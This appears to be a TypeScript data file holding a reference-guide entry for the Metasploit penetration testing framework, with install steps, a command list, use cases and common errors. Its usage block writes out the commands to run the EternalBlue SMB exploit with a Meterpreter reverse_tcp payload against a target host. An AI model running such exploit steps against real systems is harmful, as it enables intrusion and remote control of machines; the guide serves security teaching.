import { ToolGuide } from "@/lib/guide-types"

export const metasploitGuide: ToolGuide = {
  id: "metasploit",
  name: "Metasploit",
  icon: "zap",
  category: "Advanced Topics",
  description: "Penetration testing framework for exploit development, payload generation, and post-exploitation",
  installation: {
    title: "Installation",
    steps: [
      "Install via package manager (apt, brew)",
      "Use msfupdate for latest updates",
      "Build from source via GitHub"
    ],
    code: `# Debian/Ubuntu
apt install metasploit-framework

# Or from source
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install

# Update existing install
msfupdate`
  },
  usage: {
    title: "Basic Usage",
    description: "Start msfconsole, search for exploits, select a module, configure options, and execute",
    code: `# Launch console
msfconsole

# Search for an exploit
search eternalblue

# Select a module
use exploit/windows/smb/ms17_010_eternalblue

# Show required options
show options

# Set target and payload
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Execute
run`
  },
  commands: [
    { command: "use", description: "Select a module by path" },
    { command: "set", description: "Set a module option or payload" },
    { command: "run / exploit", description: "Execute the selected module" },
    { command: "search", description: "Search for modules by keyword" },
    { command: "show", description: "Display options, payloads, targets, or advanced settings" },
    { command: "info", description: "Display detailed module information" },
    { command: "back", description: "Return to the previous context" },
    { command: "sessions", description: "List, interact with, or kill active sessions" },
    { command: "setg", description: "Set a global option across all modules" },
    { command: "check", description: "Check if target is vulnerable without exploiting" },
    { command: "reload_all", description: "Reload all modules from disk" },
    { command: "route", description: "Add a route through a session for pivoting" }
  ],
  whenToUse: [
    "Exploiting known vulnerabilities in target services",
    "Generating custom payloads for various platforms",
    "Post-exploitation reconnaissance and privilege escalation",
    "Pivoting through compromised hosts to reach internal networks",
    "Validating security controls and vulnerability findings"
  ],
  notes: [
    "Always obtain proper legal authorization before testing",
    "Use resource scripts (.rc) to automate repetitive tasks",
    "Keep framework updated with msfupdate for latest exploits",
    "Meterpreter payloads provide extensive post-exploitation capabilities"
  ],
  commonErrors: [
    { error: "Exploit failed: connection refused", solution: "Verify the target service is running and the port is correct" },
    { error: "No matching payload", solution: "Run show payloads and use a compatible payload for the target OS/arch" },
    { error: "Database connection failed", solution: "Start the PostgreSQL service and run msfdb init" }
  ],
  tags: ["exploitation", "framework", "payload", "ruby", "post-exploitation"]
}
